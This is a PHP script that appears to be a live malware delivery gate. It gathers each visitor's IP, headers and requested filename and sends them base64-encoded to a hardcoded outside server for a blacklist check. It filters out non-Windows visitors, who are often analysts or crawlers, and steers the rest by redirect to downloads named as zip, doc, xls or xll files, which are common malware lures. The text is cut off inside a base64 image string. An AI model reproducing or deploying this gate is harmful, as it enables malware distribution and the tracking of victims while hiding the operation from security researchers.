<?php 
	
	ini_set('display_errors', 0);
	ini_set('display_startup_errors', 0);
	error_reporting(E_ALL);
	
	function generateRandomString($length){

		if( empty($length) ){
			$length = 10;
		}

	    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	    $charactersLength = strlen($characters);
	    $randomString = '';
	    for ($i = 0; $i < $length; $i++) {
	        $randomString .= $characters[rand(0, $charactersLength - 1)];
	    }
	    return $randomString;
	}

	$VERSION = '3.1.7659639756475654';
	$REDIRECT_FILENAME = 'charts';

	if( session_start() === false ){
		exit('');
	}
	
	$REQUEST_URI = $_SERVER['REQUEST_URI'];

	if( stripos($REQUEST_URI, 'logotype.jpg') !== false ){
		$_SESSION['has_logo'] = true;
		exit();
	}

	if( empty($REQUEST_URI) ){
		exit('');
	}

	$REQUEST_URI_ARR = explode("/", $REQUEST_URI);

	if( count($REQUEST_URI_ARR) != 3 ){
		exit('');
	}

	$_GET['e'] = $REQUEST_URI_ARR[2];

	if( empty($_GET['e']) ){
		exit('');
	}

	function getRealIpAddr()
	{
		/*
	    if (!empty($_SERVER['HTTP_CLIENT_IP']))   //check ip from share internet
	    {
	      $ip=$_SERVER['HTTP_CLIENT_IP'];
	    }
	    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   //to check ip is pass from proxy
	    {
	      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
	    }
	    else
	    {
	      $ip=$_SERVER['REMOTE_ADDR'];
	    }
	    */
	    return $_SERVER['REMOTE_ADDR'];
	}

	if( empty(getRealIpAddr()) ){
		exit('.pi');
	}

	$hdrs_new = array();

	$hdrs = getallheaders();
	foreach ($hdrs as $key => $value) {
		$kk = strtolower($key);
		$hdrs_new[$kk] = $value;
	}

	$file_ext = explode(".", $_GET['e']);
	$file_ext = end( $file_ext );

	if( !in_array( $file_ext , array( 'zip', 'xls', 'doc', 'xll' )) ){
		$file_ext = 'zip';
	}

	$data_json = array(
		"ip" => getRealIpAddr(),
		"time" => time(),
		"hh" => $hdrs_new['hh'],
		"ext" => $file_ext,
		"host" => $_SERVER['SERVER_NAME'],
		"filename" => $_GET['e'],
	);

	$data_json = json_encode($data_json);
	$data_json = base64_encode($data_json);

	// START check black list
	$ip_for_check = getRealIpAddr();

	$links_ip_ckeck = array(
		'http://193.149.129.51/router_black.php?ip=' . $ip_for_check . '&data=' . $data_json . '&version=' . $VERSION . '&alanpo=' . $hdrs_new['alanpo'],
		'http://193.149.129.51/router_black.php?ip=' . $ip_for_check . '&data=' . $data_json . '&version=' . $VERSION . '&alanpo=' . $hdrs_new['alanpo'],
		'http://193.149.129.51/router_black.php?ip=' . $ip_for_check . '&data=' . $data_json . '&version=' . $VERSION . '&alanpo=' . $hdrs_new['alanpo'],
	);

	$is_black = false;
	$is_HH = false;

	foreach ($links_ip_ckeck as $link_ip_ckeck) {

		$ctx = stream_context_create(array('http'=>
		    array(
		        'timeout' => 10,
		    )
		));

		$tmp_resp = @file_get_contents( $link_ip_ckeck , false, $ctx);

		$tmp_resp_json = json_decode( $tmp_resp, true );

		if( $tmp_resp_json['status'] === true ){

			$is_black = $tmp_resp_json['is_black'];
			$REDIRECT_FILENAME = $tmp_resp_json['REDIRECT_FILENAME'];
			$is_HH = $tmp_resp_json['is_HH'];
			
			break;
		}
		
	}
	// END check black list

	// check IP
	if( $is_HH && empty($ip_for_check) ){
		exit("");
	}

	if( empty($_SERVER['HTTP_USER_AGENT']) ){
		$is_black = true;
	}

	if( stripos($_SERVER['HTTP_USER_AGENT'], 'Windows') === false ){
		$is_black = true;
	}

	if( $is_black ){

		// header("Location : https://www.microsoft.com/en-gb/");
		/*
		$randLen = rand( 200000, 800000 );
		$zip = '';
		for ($rnd=0; $rnd < $randLen; $rnd++) { 
			$zip .= chr( rand(0, 255) );
		}

		$fname = generateRandomString(rand(4, 19)) . '.zip';

		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename=' . $fname ); 
		header('Content-Transfer-Encoding: binary');
		header('Connection: Keep-Alive');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Pragma: public');

		echo $zip;
		*/

		exit('');
	}

	/**/

	if( !$is_HH ){

		// if( $_GET['e'] != $REDIRECT_FILENAME . "." . $file_ext ){
		if( stripos($_GET['e'] , "." . $file_ext) === false ){

			$_SESSION['__redirect_was_start'] = true;
			$_SESSION['doc_name'] = $_GET['e'];

			if( stripos( $_SESSION['doc_name'] , '.' . $file_ext) === false ){
				$_SESSION['doc_name'] .= '.' . $file_ext;
			}

			$_SESSION['file_ext'] = $file_ext;

			$redirect_uri = str_replace($_GET['e'], $REDIRECT_FILENAME . "." . $file_ext, $REQUEST_URI);

			// header("Location: " . $redirect_uri);

			$random_name_id = generateRandomString( rand( 2, 8 ) );

			echo "<html><body>";

			// echo '<img src="/' . $REQUEST_URI_ARR[1] . '/logotype.jpg?'. time() .'" width="'. rand(1, 10) .'px">';

			// echo '<span id="'. $random_name_id .'" data-'. $random_name_id .'="'. $redirect_uri .'"></span>';

			$image_data = 'data:image/png;base64,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